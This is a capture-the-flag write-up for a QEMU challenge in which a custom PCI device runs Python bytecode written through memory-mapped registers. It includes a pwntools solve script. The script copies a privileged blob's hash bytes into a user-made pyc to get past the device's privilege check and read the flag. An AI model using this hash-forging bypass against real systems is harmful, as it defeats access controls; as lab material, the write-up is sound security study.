# Day 09

We are given a QEMU environment with a PCI device to run pyc. The memory mapping is:

```shell
$ lspci
00:03.0 Class 00ff: 1337:1225
$ cat /proc/iomem
  febd5000-febd5fff : 0000:00:03.0
  febd6000-febd6fff : 0000:00:03.0
  febd7000-febd7fff : 0000:00:03.0
```

Reading the code, `0xfebd5000` is the mmio, `0xfebd6000` is stdout, `0xfebd7000` is stderr. To run pyc, we need to:

1. write pyc length to `0xfebd5010`
2. write code bytes to `0xfebd5100+i`
3. trigger execution by writing to `0xfebd500c`
4. read from stdout at `0xfebd6000`
5. read from stderr at `0xfebd7000`

To read flag, we need to import `gifts` module and print `gifts.flag`. Also, the pyc must have a specific value at offset 8:

```cpp
bool privileged = pyc_hash == PYPU_PRIVILEGED_HASH;
if (privileged) {
    debug_log("[pypu] pyc hash matches privileged blob (0x%016" PRIx64 ")\n",
                PYPU_PRIVILEGED_HASH);
}
```

We create a python script to read the flag, and compile it:

```python
import gifts
print(gifts)
print(gifts.flag)
# python -m compileall getflag.py
```

Then, we override the pyc_hash to match the privileged one, send it to the pci device, and get flag from stdout:

```python
from pwn import *

context(log_level="debug")

p = process(
    ["/challenge/run.sh"],
    env={
        "PYPU_DEBUG": "1",
    },
)
p.recvuntil(b"# ")
p.sendline(b"busybox devmem 0xfebd5000 32")

privileged_code = open(
    "/opt/runtime/pypu_programs/privileged_peek_gift.pyc", "rb"
).read()
code = bytearray(open("getflag.cpython-313.pyc", "rb").read())

# override pyc_hash
for i in range(8):
    code[8 + i] = privileged_code[8 + i]


# write to code_len
p.recvuntil(b"# ")
p.sendline(f"busybox devmem 0xfebd5010 32 {len(code)}".encode())

# write code
for i in range(len(code)):
    p.recvuntil(b"# ")
    p.sendline(f"busybox devmem {hex(0xfebd5100+i)} 8 {code[i]}".encode())

# start work
p.recvuntil(b"# ")
p.sendline(f"busybox devmem 0xfebd500c 32 0".encode())

sleep(1)

# read from stdout
stdout = []
for i in range(256):
    p.recvuntil(b"# ")
    p.sendline(f"busybox devmem {hex(0xfebd6000 + i)} 8".encode())
    p.recvuntil(b"0xfebd")
    p.recvuntil(b"0x")
    data = int(p.recvline(), 16)
    stdout.append(data)

# read from stderr
stderr = []
for i in range(256):
    p.recvuntil(b"# ")
    p.sendline(f"busybox devmem {hex(0xfebd7000 + i)} 8".encode())
    p.recvuntil(b"0xfebd")
    p.recvuntil(b"0x")
    data = int(p.recvline(), 16)
    stderr.append(data)

print(bytes(stdout))
print(bytes(stderr))

p.interactive()
```
